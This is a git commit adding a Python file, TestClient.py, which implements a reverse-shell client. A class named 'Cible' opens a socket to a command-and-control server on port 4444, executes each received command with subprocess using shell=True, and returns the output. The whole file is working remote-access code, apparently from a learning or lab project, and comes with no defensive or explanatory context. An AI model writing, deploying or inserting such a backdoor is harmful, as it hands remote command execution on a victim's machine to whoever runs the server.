3585bd1e9fb489d1f97a9768543af05a6a8fff4f
Jeanchibokou <bastiencazals5@gmail.com>
2025-09-01 16:49:50 +0200

    Create TestClient.py

---
+++ TestClient.py
@@ -0,0 +1,35 @@
+import socket 
+import subprocess 
+ 
+class Cible: 
+    def __init__(self, host='...', port=4444): 
+        self.host = host 
+        self.port = port 
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+ 
+    def connect(self): 
+        try: 
+            self.socket.connect((self.host, self.port)) 
+            print(f"[+] Connecté au C2 {self.host}:{self.port}") 
+            self.send("Cible connectée")
+            running = True
+            while running: 
+                cmd = self.socket.recv(1024).decode().strip() 
+                if not cmd or cmd == "exit": 
+                    running = False
+                    continue 
+                result = subprocess.run(cmd, shell=True, capture_output=True, 
+text=True) 
+                output = result.stdout if result.stdout else result.stderr 
+                self.send(output) 
+        except Exception as e: 
+            print(f"[!] Erreur: {e}") 
+        finally: 
+            self.socket.close() 
+ 
+    def send(self, data): 
+        self.socket.send(data.encode()) 
+ 
+if __name__ == "__main__": 
+    cible1 = Cible() 
+    cible1.connect()
